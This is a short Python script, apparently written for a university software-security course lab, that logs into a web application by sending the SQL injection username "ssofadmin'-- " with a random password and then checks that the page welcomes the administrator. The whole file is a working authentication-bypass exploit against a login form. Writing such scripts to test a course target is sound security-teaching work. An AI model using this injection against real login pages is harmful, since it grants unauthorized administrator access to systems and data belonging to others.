import requests, sys, os, random
from bs4 import BeautifulSoup

SERVER = sys.argv[1]
# SERVER = 'http://d39e092608f9769e2696bf07d987072b4b2dd1dc9bce5e0151910fc276ae.project.ssof.rnl.tecnico.ulisboa.pt'

session = requests.session()

# User credentials
user = "ssofadmin'-- "
password = str(random.randint(2**27, 2**28))

# Login of the user
params = {'password' : password, 'username' : user}
r = session.post(SERVER + '/login', data=params, cookies=session.cookies)

# Get welcome text
bs = BeautifulSoup(r.text, 'html.parser')
welcome_text = bs.h3.get_text().replace(" ", "").replace("\n", "")

assert 'WelcomeSSofAdmin' in welcome_text
